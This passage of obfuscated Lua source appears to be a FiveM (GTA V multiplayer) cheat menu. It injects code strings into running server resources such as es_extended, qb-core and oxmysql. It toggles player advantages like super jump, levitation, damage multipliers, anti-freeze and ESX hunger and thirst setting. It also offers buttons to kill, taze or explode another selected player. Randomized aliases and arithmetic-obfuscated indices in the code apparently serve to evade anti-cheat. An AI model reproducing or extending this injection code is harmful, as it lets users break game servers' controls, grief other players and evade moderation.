                    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                end
            end
            
            startFreecam = function()
                if isFreecamActive then return end
                isFreecamActive = true
                local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                
                if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                RenderScriptCams(true, false, 0, true, true)
                SetCamActive(freecamHandle, true)
                CreateThread(drawThread)
                CreateThread(logicThread)
                CreateThread(cameraThread)
            end

            stopFreecam = function()
                if not isFreecamActive then return end
                isFreecamActive = false
                if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                freecamHandle = nil
            end
            
            CreateThread(function()
                while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                    if IsDisabledControlJustPressed(0, 74) then -- H key
                        if isFreecamActive then stopFreecam()
                        else startFreecam() end
                    end
                end
            end)
        end
        
        initializeFreecam()
    ]]);end,function() MachoInjectResource((v41("core") and "core") or (v41("es_extended") and "es_extended") or (v41("qb-core") and "qb-core") or (v41("monitor") and "monitor") or "any" ,[[
        g_FreecamFeatureEnabled = false
        if isFreecamActive and stopFreecam then stopFreecam() end
    ]]);end);MachoMenuCheckbox(v32[1323 -(1249 + 73) ],"Super Jump",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
        xCvBnMqWeRtYuIo = true

        local function JcWT5vYEq1()
            local yLkPwOiUtReAzXc = CreateThread
            yLkPwOiUtReAzXc(function()
                while xCvBnMqWeRtYuIo and not Unloaded do
                    local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                    local eRtYuIoPaSdFgHj = PlayerPedId()
                    local oPlMnBvCxZlKjHg = PlayerId()

                    hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                    Wait(0)
                end
            end)
        end

        JcWT5vYEq1()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        xCvBnMqWeRtYuIo = false
    ]]);end);MachoMenuCheckbox(v32[1 + 0 ],"Levitation",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        -- make helpers global so other chunks can use them
        function ScaleVector(vect, mult)
            return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
        end

        function AddVectors(vect1, vect2)
            return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
        end

        function ApplyForce(entity, direction)
            local XroXTNEFqxoWfH = ApplyForceToEntity
            XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
        end

        function SubVectors(vect1, vect2)
            return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
        end

        function Oscillate(entity, position, angleFreq, dampRatio)
            local OBaTQqteIpmZVo = GetEntityVelocity
            local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
            local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
            local targetPos = SubVectors(pos1, pos2)
            ApplyForce(entity, targetPos)
        end

        function RotationToDirection(rot)
            local radZ = math.rad(rot.z)
            local radX = math.rad(rot.x)
            local cosX = math.cos(radX)
            return vector3(
                -math.sin(radZ) * cosX,
                math.cos(radZ) * cosX,
                math.sin(radX)
            )
        end

        function GetClosestCoordOnLine(startCoords, endCoords, entity)
            local CDGcdMQhosGVCf = GetShapeTestResult
            local UaWIFHgeizhHua = StartShapeTestRay
            local result, hit, hitCoords, surfaceNormal, entityHit =
                CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
            return hit == 1, hitCoords
        end

        function GetCameraLookingAtCoord(distance)
            local playerPed = PlayerPedId()
            local camRot = GetGameplayCamRot(2)
            local camCoord = GetGameplayCamCoord()
            local forwardVector = RotationToDirection(camRot)
            local destination = vector3(
                camCoord.x + forwardVector.x * distance,
                camCoord.y + forwardVector.y * distance,
                camCoord.z + forwardVector.z * distance
            )
            local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
            if hit then return endCoords else return destination end
        end
    ]]);MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function awfjawr57awt7f()
            nxtBFlQWMMeRLs = true

            local jIiIfikctHYrlH = CreateThread
            jIiIfikctHYrlH(function()
                while nxtBFlQWMMeRLs and not Unloaded do
                    Wait(0)
                    local ped = PlayerPedId()

                    local SZxuJlyJQmGlZz = SetPedCanRagdoll
                    local valuOZfymjeVaH = IsEntityPlayingAnim
                    local IiHiLVRagMQhrn = RequestAnimDict
                    local mOZOquvggdnbod = HasAnimDictLoaded
                    local UFZdrZNXpLwpjT = TaskPlayAnim
                    local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                    local OyvuuAMyvjtIzD = GetGameplayCamRot
                    local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                    while XKWvPIkCKMXIfR(0, 22) do
                        SZxuJlyJQmGlZz(ped, false)

                        if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                            IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                            while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                Wait(0)
                            end
                            UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                8.0, -8.0, -1, 49, 0, false, false, false)
                        end

                        local camRot = OyvuuAMyvjtIzD(2)
                        local camHeading = (camRot.z + 360) % 360
                        local direction = cQPIZtKyyWaVcY(77)

                        SetEntityHeading(ped, camHeading)
                        Oscillate(ped, direction, 0.33, 0.9)

                        Wait(1)
                    end

                    if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                        ClearPedTasks(ped)
                    end

                    SZxuJlyJQmGlZz(ped, true)
                end
            end)
        end

        awfjawr57awt7f()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        nxtBFlQWMMeRLs = false
        ClearPedTasks(PlayerPedId())
    ]]);end);MachoMenuCheckbox(v32[1],"Super Strength",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
        fgawjFmaDjdALaO = true

        local holdingEntity = false
        local holdingCarEntity = false
        local holdingPed = false
        local heldEntity = nil
        local entityType = nil
        local awfhjawrasfs = CreateThread

        awfhjawrasfs(function()
            while fgawjFmaDjdALaO and not Unloaded do
                Wait(0)
                if holdingEntity and heldEntity then
                    local playerPed = PlayerPedId()
                    local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                    
                    if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                        RequestAnimDict('anim@mp_rollarcoaster')
                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                            Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                    elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                        RequestAnimDict('anim@heists@box_carry@')
                        while not HasAnimDictLoaded('anim@heists@box_carry@') do
                            Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                    end

                    if not IsEntityAttached(heldEntity) then
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                    end
                end
            end
        end)

        awfhjawrasfs(function()
            while fgawjFmaDjdALaO and not Unloaded do
                Wait(0)
                local playerPed = PlayerPedId()
                local camPos = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)
                local direction = RotationToDirection(camRot)
                local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                local validTarget = false

                if hit == 1 then
                    entityType = GetEntityType(entityHit)
                    if entityType == 3 or entityType == 2 or entityType == 1 then
                        validTarget = true
                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                    end
                end

                if IsDisabledControlJustReleased(0, 38) then
                    if validTarget and not holdingEntity then
                        holdingEntity = true
                        heldEntity = entityHit

                        local wfuawruawts = AttachEntityToEntity

                        if entityType == 3 then
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                        elseif entityType == 2 then
                            holdingCarEntity = true
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        elseif entityType == 1 then
                            holdingPed = true
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        end
                    end
                elseif IsDisabledControlJustReleased(0, 246) then
                    if holdingEntity then
                        local wgfawhtawrs = DetachEntity
                        local dfgjsdfuwer = ApplyForceToEntity
                        local sdgfhjwserw = ClearPedTasks

                        wgfawhtawrs(heldEntity, true, true)
                        dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                        sdgfhjwserw(PlayerPedId())
                    end
                end
            end
        end)

        function RotationToDirection(rotation)
            local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
            local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
            return direction
        end

        function DrawText3Ds(x, y, z, text)
            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
            local px, py, pz = table.unpack(GetGameplayCamCoords())
            local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
            local fov = (1 / GetGameplayCamFov()) * 100
            scale = scale * fov

            if onScreen then
                SetTextScale(0.0 * scale, 0.35 * scale)
                SetTextFont(0)
                SetTextProportional(1)
                SetTextColour(255, 255, 255, 215)
                SetTextDropshadow(0, 0, 0, 0, 155)
                SetTextEdge(2, 0, 0, 0, 150)
                SetTextDropShadow()
                -- SetTextOutline()
                SetTextEntry("STRING")
                SetTextCentre(1)
                AddTextComponentString(text)
                DrawText(_x, _y)
            end
        end
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        fgawjFmaDjdALaO = false
    ]]);end);MachoMenuCheckbox(v32[1146 -(466 + 679) ],"Super Punch",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
        qWeRtYuIoPlMnBv = true

        local function NdaFBuHkvo()
            local uTrEsAzXcVbNmQw = CreateThread
            uTrEsAzXcVbNmQw(function()
                while qWeRtYuIoPlMnBv and not Unloaded do
                    local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                    local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                    local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                    local sDfGhJkLqWeRtYu = PlayerId()
                    local DamageRateValue = 150.0
                    local WeaponNameForDamage = "WEAPON_UNARMED"


                    nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                    cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                    bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                    Wait(0)
                end
            end)
        end

        NdaFBuHkvo()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local qWeRtYuIoPlMnBv = false
        local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
        local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
        local bNmQwErTyUiOpAs = SetWeaponDamageModifier
        local sDfGhJkLqWeRtYu = PlayerId()

        nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
        cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
        bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
    ]]);end);MachoMenuCheckbox(v32[1],"Throw From Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
        zXpQwErTyUiPlMn = true

        local function qXzRP7ytKW()
            local iLkMzXvBnQwSaTr = CreateThread
            iLkMzXvBnQwSaTr(function()
                while zXpQwErTyUiPlMn and not Unloaded do
                    local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                    vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                    Wait(0)
                end
            end)
        end

        qXzRP7ytKW()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        zXpQwErTyUiPlMn = false
    ]]);end);MachoMenuCheckbox(v32[2 -1 ],"Force Third Person",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
        kJfGhTrEeWqAsDz = true

        local function pqkTRWZ38y()
            local gKdNqLpYxMiV = CreateThread
            gKdNqLpYxMiV(function()
                while kJfGhTrEeWqAsDz and not Unloaded do
                    local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                    local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                    qWeRtYuIoPlMnBv(0)
                    aSdFgHjKlQwErTy(0)
                    Wait(0)
                end
            end)
        end

        pqkTRWZ38y()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        kJfGhTrEeWqAsDz = false
    ]]);end);MachoMenuCheckbox(v32[2 -1 ],"Force Driveby",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
        zXcVbNmQwErTyUi = true

        local function UEvLBcXqM6()
            local cVbNmAsDfGhJkLz = CreateThread
            cVbNmAsDfGhJkLz(function()
                while zXcVbNmQwErTyUi and not Unloaded do
                    local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                    local eRtYuIoPaSdFgHi = PlayerPedId()

                    lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                    Wait(0)
                end
            end)
        end

        UEvLBcXqM6()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        zXcVbNmQwErTyUi = false
    ]]);end);MachoMenuCheckbox(v32[1901 -(106 + 1794) ],"Anti-Headshot",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
        yHnvrVNkoOvGMWiS = true

        local eeitKYqDwYbPslTW = CreateThread
        local function LIfbdMbeIAeHTnnx()
            eeitKYqDwYbPslTW(function()
                while yHnvrVNkoOvGMWiS and not Unloaded do
                    local fhw72q35d8sfj = SetPedSuffersCriticalHits
                    fhw72q35d8sfj(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        end

        LIfbdMbeIAeHTnnx()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        yHnvrVNkoOvGMWiS = false
        fhw72q35d8sfj(PlayerPedId(), true)
    ]]);end);MachoMenuCheckbox(v32[1 + 0 ],"Anti-Freeze",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
        nHgFdSaZxCvBnMq = true

        local sdfw3w3tsdg = CreateThread
        local function XELa6FJtsB()
            sdfw3w3tsdg(function()
                while nHgFdSaZxCvBnMq and not Unloaded do
                    local fhw72q35d8sfj = FreezeEntityPosition
                    local segfhs347dsgf = ClearPedTasks

                    if IsEntityPositionFrozen(PlayerPedId()) then
                        fhw72q35d8sfj(PlayerPedId(), false)
                        segfhs347dsgf(PlayerPedId())
                    end
                    
                    Wait(0)
                end
            end)
        end

        XELa6FJtsB()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        nHgFdSaZxCvBnMq = false
    ]]);end);MachoMenuCheckbox(v32[1],"Anti-Blackscreen",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
        aDjsfmansdjwAEl = true

        local sdfw3w3tsdg = CreateThread
        local function XELWAEDa6FJtsB()
            sdfw3w3tsdg(function()
                while aDjsfmansdjwAEl and not Unloaded do
                    DoScreenFadeIn(0)
                    Wait(0)
                end
            end)
        end

        XELWAEDa6FJtsB()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        aDjsfmansdjwAEl = false
    ]]);end);local v44=MachoMenuInputbox(v32[1 + 1 ],"Model Name:","...");MachoMenuButton(v32[5 -3 ],"Change Model",function() local v150=MachoMenuGetInputbox(v44);if ((type(v150)=="string") and (v150~="")) then local v248=0 -0 ;local v249;while true do if (0==v248) then v249=string.format([[
            local function GykR8qjWTp()
                local nHgFdSaZxCvBnMq = RequestModel
                local xCvBnMqWeRtYuIo = HasModelLoaded
                local aSdFgHjKlQwErTy = SetPlayerModel
                local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                nHgFdSaZxCvBnMq(GetHashKey("%s"))
                while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                    Wait(1)
                end
                
                aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                oPlMnBvCxZlKjHg(PlayerPedId())
            end

            GykR8qjWTp()
        ]],v150,v150,v150);MachoInjectResource((v41("oxmysql") and "oxmysql") or "any" ,v249);break;end end end end);MachoMenuButton(v32[116 -(4 + 110) ],"White Thug Drip",function() local v151=584 -(57 + 527) ;while true do if (v151==0) then function WhiteThugDrip() local v296=1427 -(41 + 1386) ;local v297;while true do if (v296==(105 -(17 + 86))) then SetPedComponentVariation(v297,3 + 1 ,124 -68 ,0 -0 ,2);SetPedComponentVariation(v297,172 -(122 + 44) ,32 -13 ,0 -0 ,2 + 0 );v296=1 + 2 ;end if (v296==(0 -0)) then v297=PlayerPedId();SetPedComponentVariation(v297,11,109,0,67 -(30 + 35) );v296=1 + 0 ;end if ((1260 -(1043 + 214))==v296) then SetPedPropIndex(v297,0,1,0 -0 ,true);break;end if (v296==1) then SetPedComponentVariation(v297,1220 -(323 + 889) ,15,0 -0 ,2);SetPedComponentVariation(v297,583 -(361 + 219) ,325 -(53 + 267) ,0 + 0 ,2);v296=415 -(15 + 398) ;end end end WhiteThugDrip();break;end end end);MachoMenuButton(v32[2],"JTG Mafia Drip",function() local v152=0;while true do if (v152==(982 -(18 + 964))) then function JTGMafia() local v298=PlayerPedId();SetPedComponentVariation(v298,41 -30 ,5,0 + 0 ,2 + 0 );SetPedComponentVariation(v298,858 -(20 + 830) ,12 + 3 ,0,128 -(116 + 10) );SetPedComponentVariation(v298,3,1 + 4 ,0,740 -(542 + 196) );SetPedComponentVariation(v298,8 -4 ,42,0 + 0 ,2);SetPedComponentVariation(v298,4 + 2 ,6,0,1 + 1 );SetPedPropIndex(v298,0,26,0,true);SetPedPropIndex(v298,1,7 -4 ,0 -0 ,true);end JTGMafia();break;end end end);MachoMenuButton(v32[3],"Heal",function() SetEntityHealth(PlayerPedId(),1751 -(1126 + 425) );end);MachoMenuButton(v32[3],"Armor",function() SetPedArmour(PlayerPedId(),100);end);MachoMenuButton(v32[3],"Fill Hunger",function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function DawrjatjsfAW()
            TriggerEvent('esx_status:set', 'hunger', 1000000)
        end

        DawrjatjsfAW()
    ]]);end);MachoMenuButton(v32[408 -(118 + 287) ],"Fill Thirst",function() MachoInjectResource2(11 -8 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function sWj238fsMAw()
            TriggerEvent('esx_status:set', 'thirst', 1000000)
        end

        sWj238fsMAw()
    ]]);end);MachoMenuButton(v32[3],"Revive VIP Only",function() end);MachoMenuButton(v32[1124 -(118 + 1003) ],"Suicide",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function RGybF0JqEt()
            local aSdFgHjKlQwErTy = SetEntityHealth
            aSdFgHjKlQwErTy(PlayerPedId(), 0)
        end

        RGybF0JqEt()
    ]]);end);MachoMenuButton(v32[8 -5 ],"Force Ragdoll",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function awfAEDSADWEf()
            local cWAmdjakwDksFD = SetPedToRagdoll
            cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
        end

        awfAEDSADWEf()
    ]]);end);MachoMenuButton(v32[380 -(142 + 235) ],"Clear Task",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function iPfT7kN3dU()
            local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
            zXcVbNmAsDfGhJk(PlayerPedId())
        end

        iPfT7kN3dU()
    ]]);end);MachoMenuButton(v32[13 -10 ],"Clear Vision",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function MsVqZ29ptY()
            local qWeRtYuIoPlMnBv = ClearTimecycleModifier
            local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

            qWeRtYuIoPlMnBv()
            kJfGhTrEeWqAsDz()
        end

        MsVqZ29ptY()
    ]]);end);MachoMenuButton(v32[3],"Randomize Outfit",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function UxrKYLp378()
            local UwEsDxCfVbGtHy = PlayerPedId
            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
            local QwAzXsEdCrVfBg = SetPedComponentVariation
            local LkJhGfDsAqWeRt = SetPedHeadBlendData
            local MnBgVfCdXsZaQw = SetPedHairColor
            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
            local TyUiOpAsDfGhJk = SetPedHeadOverlay
            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
            local DfGhJkLzXcVbNm = ClearPedProp

            local function PqLoMzNkXjWvRu(component, exclude)
                local ped = UwEsDxCfVbGtHy()
                local total = FdSaQwErTyUiOp(ped, component)
                if total <= 1 then return 0 end
                local choice = exclude
                while choice == exclude do
                    choice = math.random(0, total - 1)
                end
                return choice
            end

            local function OxVnBmCxZaSqWe(component)
                local ped = UwEsDxCfVbGtHy()
                local total = FdSaQwErTyUiOp(ped, component)
                return total > 1 and math.random(0, total - 1) or 0
            end

            local ped = UwEsDxCfVbGtHy()

            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

            local face = math.random(0, 45)
            local skin = math.random(0, 45)
            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

            local hairMax = FdSaQwErTyUiOp(ped, 2)
            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
            MnBgVfCdXsZaQw(ped, 0, 0)

            local brows = RtYuIoPlMnBvCx(2)
            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

            DfGhJkLzXcVbNm(ped, 0)
            DfGhJkLzXcVbNm(ped, 1)
        end

        UxrKYLp378()
    ]]);end);MachoMenuButton(v33[1 + 0 ],"Kill Player",function() local v153=MachoMenuGetSelectedPlayer();if (v153 and (v153>(977 -(553 + 424)))) then MachoInjectResource((v41("oxmysql") and "oxmysql") or "any" ,([[
            local function UiLpKjHgFdSaTrEq()
                local RvTyUiOpAsDfGhJ = %d

                local dFrTgYhUjIkLoPl = CreateThread
                dFrTgYhUjIkLoPl(function()
                    Wait(0)

                    local ZxCvBnMaSdFgTrEq = GetPlayerPed
                    local TyUiOpAsDfGhJkLz = GetEntityCoords
                    local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                    local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                    if not pEd or not DoesEntityExist(pEd) then return end

                    local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                    local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                    QwErTyUiOpAsDfGh(
                        oRiGiN.x, oRiGiN.y, oRiGiN.z,
                        tArGeT.x, tArGeT.y, tArGeT.z,
                        500.0,
                        true,
                        GetHashKey("WEAPON_ASSAULTRIFLE"),
                        PlayerPedId(),
                        true,
                        false,
                        -1.0
                    )
                end)
            end

            UiLpKjHgFdSaTrEq()
        ]]):format(v153));end end);MachoMenuButton(v33[1 -0 ],"Taze Player",function() local v154=0;local v155;while true do if ((0 + 0)==v154) then v155=MachoMenuGetSelectedPlayer();if (v155 and (v155>(0 + 0))) then MachoInjectResource((v41("oxmysql") and "oxmysql") or "any" ,([[
            local function UiLpKjHgFdSaTrEq()
                local RvTyUiOpAsDfGhJ = %d

                local dFrTgYhUjIkLoPl = CreateThread
                dFrTgYhUjIkLoPl(function()
                    Wait(0)

                    local ZxCvBnMaSdFgTrEq = GetPlayerPed
                    local TyUiOpAsDfGhJkLz = GetEntityCoords
                    local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
                    local pEd = ZxCvBnMaSdFgTrEq(RvTyUiOpAsDfGhJ)

                    if not pEd or not DoesEntityExist(pEd) then return end

                    local tArGeT = TyUiOpAsDfGhJkLz(pEd)
                    local oRiGiN = vector3(tArGeT.x, tArGeT.y, tArGeT.z + 2.0)

                    QwErTyUiOpAsDfGh(
                        oRiGiN.x, oRiGiN.y, oRiGiN.z,
                        tArGeT.x, tArGeT.y, tArGeT.z,
                        0,
                        true,
                        GetHashKey("WEAPON_STUNGUN"),
                        PlayerPedId(),
                        true,
                        false,
                        -1.0
                    )
                end)
            end

            UiLpKjHgFdSaTrEq()
        ]]):format(v155));end break;end end end);MachoMenuButton(v33[1 + 0 ],"Explode Player",function() local v156=0 + 0 ;local v157;while true do if (v156==(0 + 0)) then v157=MachoMenuGetSelectedPlayer();if (v157 and (v157>0)) then MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,([[
            local function TzYuIoPlMnBvCxZa()
                local iOpAsDfGhJkLzXcV = %d

                local ZqWeRtYuIoPlMnB = CreateThread
                ZqWeRtYuIoPlMnB(function()
                    Wait(0)

                    local jBtWxFhPoZuR = GetPlayerPed
                    local mWjErTbYcLoU = GetEntityCoords
                    local aSdFgTrEqWzXcVb = AddExplosion

                    local pEd = jBtWxFhPoZuR(iOpAsDfGhJkLzXcV)
                    if not pEd or not DoesEntityExist(pEd) then return end

                    local coords = mWjErTbYcLoU(pEd)
                    aSdFgTrEqWzXcVb(coords.x, coords.y, coords.z, 6, 10.0, true, false, 1.0)
                end)
            end

